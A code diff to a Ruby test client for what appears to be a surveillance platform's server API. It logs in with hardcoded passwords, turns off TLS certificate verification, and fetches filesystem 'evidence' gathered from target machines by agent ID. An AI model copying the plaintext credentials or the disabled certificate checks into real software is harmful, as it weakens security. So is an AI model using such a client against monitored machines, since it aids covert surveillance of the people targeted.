@@ -11,8 +11,8 @@ class CGI
   end
 end
 
-#http = Net::HTTP.new('localhost', 443)
-http = Net::HTTP.new('rcs-castore', 443)
+http = Net::HTTP.new('localhost', 4444)
+#http = Net::HTTP.new('rcs-castore', 443)
 http.use_ssl = true
 http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
@@ -23,11 +23,10 @@ http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 #resp = http.request_post('/auth/reset', account.to_json, nil)
 #puts "auth.create"
 #puts resp.body
-
 # login
 account = {
-  :user => 'daniele',
-  :pass => 'danielep123'
+  :user => 'alor',
+  :pass => 'demorcss'
   }
 resp = http.request_post('/auth/login', account.to_json, nil)
 puts "auth.login"
@@ -765,7 +764,7 @@ if false
 end
 
 # agents
-if true
+if false
 =begin
   res = http.request_get('/operation', {'Cookie' => cookie})
   operations = JSON.parse(res.body)
@@ -1333,9 +1332,13 @@ if false
 end
 
 # filesystem
-if false
+if true
+  
+  filter = "^C:\\\\Windows$"
+  filter = "^[[:alpha:]]:$"
+  
   puts "evidence.filesystem"
-  res = http.request_get(URI.escape('/evidence/filesystem?target=4F6058FF2AFB65C94400006D'), {'Cookie' => cookie})
+  res = http.request_get(URI.escape("/evidence/filesystem?target=4F86902a2afb6512a700006f&agent=5008225C2AFB654A4F003B9B&filter=#{filter}"), {'Cookie' => cookie})
   puts res.body
   puts
   
